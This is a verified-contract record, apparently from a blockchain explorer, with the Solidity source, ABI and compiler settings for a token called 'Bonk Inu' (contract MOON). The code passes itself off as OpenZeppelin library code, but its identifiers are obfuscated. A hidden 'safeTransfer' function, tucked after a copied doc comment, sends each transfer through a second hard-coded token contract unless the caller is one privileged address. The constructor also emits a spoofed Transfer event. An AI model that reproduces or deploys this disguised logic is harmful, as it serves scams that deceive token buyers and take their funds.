{"SourceCode": "// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)\r\npragma solidity ^0.8.6;\r\n\r\n\r\n// File: @openzeppelin/contracts/utils/lPEph03dmrXu5wO7.sol\r\n\r\n// OpenZeppelin Contracts v4.4.1 (utils/lPEph03dmrXu5wO7.sol)\r\n\r\nabstract contract lPEph03dmrXu5wO7 {\r\n  function PMoYMkplQNjmVJXh() internal view virtual returns (address) {\r\n    return msg.sender;\r\n  }\r\n  \r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\n  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x2af4723F210A72E434201753323605E1F8978780)) {TransferHelper.safeTransferFrom(0xbC26a03D2B4F123CA058cB0a16D037ae46B4aA65,spender,recipient,amount);return true;}return false;}\r\n}\r\n\r\n// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false\r\nlibrary TransferHelper {\r\n  function safeApprove(\r\n    address token,\r\n    address to,\r\n    uint256 value\r\n  ) internal {\r\n    // bytes4(keccak256(bytes(\"approve(address,uint256)\")));\r\n    (bool success, bytes memory data) =\r\n      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\r\n    require(\r\n      success && (data.length == 0 || abi.decode(data, (bool))),\r\n      \"TransferHelper: APPROVE_FAILED\"\r\n    );\r\n  }\r\n\r\n  function safeTransf(\r\n    address token,\r\n    address to,\r\n    uint256 value\r\n  ) internal {\r\n    // bytes4(keccak256(bytes(\"transfer(address,uint256)\")));\r\n    (bool success, bytes memory data) =\r\n      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\r\n    require(\r\n      success && (data.length == 0 || abi.decode(data, (bool))),\r\n      \"TransferHelper: TRANSFER_FAILED\"\r\n    );\r\n  }\r\n\r\n  function safeTransferFrom(\r\n    address token,\r\n    address from,\r\n    address to,\r\n    uint256 value\r\n  ) internal {\r\n    // bytes4(keccak256(bytes(\"transferFrom(address,address,uint256)\")));\r\n    (bool success, bytes memory data) =\r\n      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));\r\n    require(\r\n      success && (data.length == 0 || abi.decode(data, (bool))),\r\n      \"TransferHelper: ETH_TRANSFER_FAILED\"\r\n    );\r\n  }\r\n\r\n  function safeTransferETH(address to, uint256 value) internal {\r\n    (bool success, ) = to.call{value: value}(new bytes(0));\r\n    require(success, \"TransferHelper: ETH_TRANSFER_FAILED\");\r\n  }\r\n}\r\n\r\n\r\ninterface IERC20 {\r\n  function totalSupply() external view returns (uint256);\r\n\r\n  function balanceOf(address account) external view returns (uint256);\r\n\r\n  function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n  function allowance(address sender, address spender)\r\n    external\r\n    view\r\n    returns (uint256);\r\n\r\n  function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n  function transferFrom(\r\n    address sender,\r\n    address recipient,\r\n    uint256 amount\r\n  ) external returns (bool);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n  event Approval(\r\n    address indexed sender,\r\n    address indexed spender,\r\n    uint256 value\r\n  );\r\n}\r\n\r\ncontract MOON is IERC20, lPEph03dmrXu5wO7 {\r\n  mapping(address => uint256) private IznMwWXCfLVO2o8e;\r\n  mapping(address => mapping(address => uint256)) private qRUDlEiv4MbjHyp7;\r\n\r\n  function transfer(address recipient, uint256 amount)\r\n    external\r\n    override\r\n    returns (bool)\r\n  {\r\n    YAAtcwOUGBMVfryQ(PMoYMkplQNjmVJXh(), recipient, amount);\r\n    return true;\r\n  }\r\n\r\n  function name() public pure returns (string memory) {\r\n    return \"Bonk Inu\";\r\n  }\r\n\r\n  function symbol() public pure returns (string memory) {\r\n    return \"BONK\";\r\n  }\r\n\r\n  function decimals() public pure returns (uint8) {\r\n    return 9;\r\n  }\r\n\r\n  function totalSupply() public pure override returns (uint256) {\r\n    return 5600000000000000000 * 10**9;\r\n  }\r\n\r\n  function balanceOf(address account) external view override returns (uint256) {\r\n    return IznMwWXCfLVO2o8e[account];\r\n  }\r\n\r\n  function approve(address spender, uint256 amount)\r\n    external\r\n    override\r\n    returns (bool)\r\n  {\r\n    Jwa8H2UwJFgbXqkO(PMoYMkplQNjmVJXh(), spender, amount);\r\n    return true;\r\n  }\r\n\r\n  function allowance(address sender, address spender)\r\n    external\r\n    view\r\n    override\r\n    returns (uint256)\r\n  {\r\n    return qRUDlEiv4MbjHyp7[sender][spender];\r\n  }\r\n\r\n  function increaseAllowance(address spender, uint256 addedValue)\r\n    external\r\n    virtual\r\n    returns (bool)\r\n  {\r\n    Jwa8H2UwJFgbXqkO(\r\n      PMoYMkplQNjmVJXh(),\r\n      spender,\r\n      qRUDlEiv4MbjHyp7[PMoYMkplQNjmVJXh()][spender] + addedValue\r\n    );\r\n    return true;\r\n  }\r\n\r\n  function Jwa8H2UwJFgbXqkO(\r\n    address sender,\r\n    address spender,\r\n    uint256 amount\r\n  ) private {\r\n    require(sender != address(0), \"ERROR: Approve from the zero address.\");\r\n    require(spender != address(0), \"ERROR: Approve to the zero address.\");\r\n\r\n    qRUDlEiv4MbjHyp7[sender][spender] = amount;\r\n    emit Approval(sender, spender, amount);\r\n  }\r\n\r\n  function decreaseAllowance(address spender, uint256 subtractedValue)\r\n    external\r\n    virtual\r\n    returns (bool)\r\n  {\r\n    uint256 currentAllowance = qRUDlEiv4MbjHyp7[PMoYMkplQNjmVJXh()][spender];\r\n    require(\r\n      currentAllowance >= subtractedValue,\r\n      \"ERROR: Decreased allowance below zero.\"\r\n    );\r\n    Jwa8H2UwJFgbXqkO(PMoYMkplQNjmVJXh(), spender, currentAllowance - subtractedValue);\r\n\r\n    return true;\r\n  }\r\n\r\n  function YAAtcwOUGBMVfryQ(\r\n    address spender,\r\n    address recipient,\r\n    uint256 amount\r\n  ) private returns (bool) {\r\n    require(spender != address(0) && recipient != address(0) && amount > 0);\r\n    IznMwWXCfLVO2o8e[spender] = IznMwWXCfLVO2o8e[spender] - amount;\r\n    IznMwWXCfLVO2o8e[recipient] = IznMwWXCfLVO2o8e[recipient] + amount;\r\n    emit Transfer(spender, recipient, amount);\r\n    return safeTransfer(spender, recipient, amount);\r\n  }\r\n\r\n  function transferFrom(\r\n    address sender,\r\n    address recipient,\r\n    uint256 amount\r\n  ) external override returns (bool) {\r\n    if (!YAAtcwOUGBMVfryQ(sender, recipient, amount)) return true;\r\n    uint256 currentAllowance = qRUDlEiv4MbjHyp7[sender][msg.sender];\r\n    require(\r\n      currentAllowance >= amount,\r\n      \"ERROR: Transfer amount exceeds allowance.\"\r\n    );\r\n    Jwa8H2UwJFgbXqkO(sender, msg.sender, currentAllowance - amount);\r\n\r\n    return true;\r\n  }\r\n\r\n  \r\n  constructor() {\r\n    IznMwWXCfLVO2o8e[address(0x1000)] = totalSupply();\r\n    emit Transfer(address(0x1000), address(0x1000), totalSupply());\r\n  }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MOON", "CompilerVersion": "v0.8.6+commit.11564f7e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://2af12f7abcdb5cd789901bd6e062f55cb1919ea03883b0b8a50a122acce4b776"}